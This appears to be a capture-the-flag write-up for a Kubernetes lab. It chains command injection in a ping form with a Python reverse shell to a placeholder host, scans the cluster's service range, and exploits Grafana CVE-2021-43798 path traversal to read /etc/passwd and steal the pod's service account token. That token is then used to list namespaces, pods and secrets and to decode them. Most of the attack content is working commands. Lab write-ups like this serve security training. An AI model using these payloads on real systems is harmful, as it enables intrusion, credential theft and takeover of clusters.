# Challenge write up

## Introduction

We have a virtual machine that run a kind cluster. We can access the cluster using the kubectl command. We can also access the cluster using the dashboard.

The virtual machine only expose the port 80, that is a web application. We have to exploit the web application to get a shell on the pod that run the web application.

## Step 1

We have a web application, running on port 80. We can access the web application using the browser.

The first phase is the discovery of the application. Our target will be the web application running on [http://localhost:8080](http://localhost:8080).
We can grab application banner to detect the framework used by the web application.

```bash
curl -IL http://localhost:8080
```

This gave us the following result:

```bash
HTTP/1.1 200 OK
Server: Werkzeug/2.3.4 Python/3.9.16
Date: Sun, 21 May 2023 13:41:25 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1627
Connection: close
```

Inside the web application, we can see a form that allow us to enter value and the prompt return a `ping <value>` response.
We can try some command injection using `|` and `;`, for example we can try `; ls` that show us the webserver source code.

Using that command injection, we can try to get a reverse shell on the server. We can use the following command:

```bash
8.8.8.8; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

_Don't forget to replace `<YOUR_LOCAL_IP>` by your IP address._

This command will spawn a reverse shell on the server, but we have to listen on the port 9001 to get the shell.

```bash
nc -lvnp 9001
```

When the python code will be interpreted, this will order the server to initiate a connection on the target IP and PORT provided (in our case, that our laptop).
Notice that even if they were a firewall, the connection will be initiated from the server to our laptop, so the firewall will not block the connection. Firewall should have block the connection if we are connecting to the server but not the opposite.

## Step 2

Gaining access to the pod allow us to use it as proxy and request the cluster from an internal resource.

### Discovery script

I wrote a simple bash script allowing me to scan the cluster network to find kubernetes services. For information, kubernetes services default ip range is 10.96.0.0/16.

```bash
#!/bin/bash
# Set the timeout value (in seconds)
timeout=0.03
# Loop through each IP address in the range 10.96.0.0/16
for third_octet in {56..255}; do
  for fourth_octet in {0..255}; do
    ip="10.96.$third_octet.$fourth_octet"

    # Loop through each port
    while read -r port; do
      url="http://${ip}:${port}"
      response_code=$(curl -s -o /dev/null -w "%{http_code}" --max-time $timeout "$url")

      if [[ $response_code -ge 200 && $response_code -lt 400 ]]; then
        echo "Success: $url (HTTP $response_code)"
        # Continue testing other combinations
      fi
    done < "ports.txt"
  done
  echo "Range 10.96.$third_octet.0/24 done"
done
```

Note: This script will take a long time to complete, i recommend to cheat and ajust the ip range to scope the grafana ip.

At this step, you will find some accessible IP addresses.
For convenience, we can set the ip on a variable:

```bash
export TARGET_IP=<IP_FOUND>
```

```bash
curl -IL http://$TARGET_IP:3000
```

Get the grafana version running:

```bash
curl http://$TARGET_IP:3000/login | grep "subTitle"
```

You should find that the grafana running is outdated and futhermore, the version 8.3.0 is weel-know to be vulnerable to CVE-2021-43798.

Damn, it's vulnerable: https://github.com/jas502n/Grafana-CVE-2021-43798

If you inspect the CVE informations, you can understand that we can use an endpoint to read file on the grafana server without being authenticated.
The endpoint is `/public/plugins/alertlist/../../../../../../../../etc/passwd`

### Attacking

To get some information about the server, we can try to read the `/etc/passwd` file.

```bash
curl --path-as-is http://$TARGET_IP:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
```

Damn, we can read the `/etc/passwd` file. That's mean we can read any file on the server.
Obviously, that's cool and we are already gaining some cool stuff, but as a reminder, we are on a kubernetes cluster, we can get cooler stuff ;)

Kubernetes give serviceAccount to pods allowing them to have access, roles or others things. As described in the documentation, the ServiceAccount token of your Pod is provisionned by kubernetes on the pod filesystem at this location:
`/var/run/secrets/kubernetes.io/serviceaccount/token`

Using this vulnerability on grafana and our knowledge, we can grab the service account token of grafana and use it to interact with the cluster.

```bash
curl --path-as-is http://$TARGET_IP:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
```

You can check what's in the JWT on [JWT.io](https://jwt.io/)

### Interact with the cluster using the service account

Set your token environment variable:

```bash
export TOKEN=$(curl --path-as-is http://$TARGET_IP:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token)
```

At this step, we own the grafana serviceAccount token, allowing us to request the cluster as if we were the grafana pod. (And with the grafana serviceAccount permissions).

#### Namespaces

For example, you can try to list namespaces for your cluster:

```bash
curl -H "Authorization: Bearer $TOKEN" "https://kubernetes.default.svc:443/api/v1/namespaces" -m 3 --insecure
# OR
wget --header="Authorization: Bearer $TOKEN" --timeout=3 --no-check-certificate https://kubernetes.default.svc:443/api/v1/namespaces
```

#### Pod

Listing pods.

```bash
curl -H "Authorization: Bearer $TOKEN" "https://kubernetes.default.svc:443/api/v1/pods" -m 3 --insecure
# OR
wget --header="Authorization: Bearer $TOKEN" --timeout=3 --no-check-certificate https://kubernetes.default.svc:443/api/v1/pods
```

Notice: As you are using the grafana serviceAccount, you will only see the pods that are on the same namespace as grafana. But you can change the namespace to see others resources.

For example, you can try to list the pods on the kube-system namespace:

```bash
curl -H "Authorization: Bearer $TOKEN" "https://kubernetes.default.svc:443/api/v1/namespaces/kube-system/pods" -m 3 --insecure
```

#### Secrets

Listing secrets.

```bash
curl -H "Authorization: Bearer $TOKEN" "https://kubernetes.default.svc:443/api/v1/secrets" -m 3 --insecure
# OR
wget --header="Authorization: Bearer $TOKEN" --timeout=3 --no-check-certificate https://kubernetes.default.svc:443/api/v1/secrets
```

For example, you can try to list the secrets on the kube-system namespace:

```bash
curl -H "Authorization: Bearer $TOKEN" "https://kubernetes.default.svc:443/api/v1/namespaces/kube-system/secrets" -m 3 --insecure
```

If you want to decrypt the secrets, you can use the following command:

```bash
echo <SECRET_VALUE> | base64 -d
```
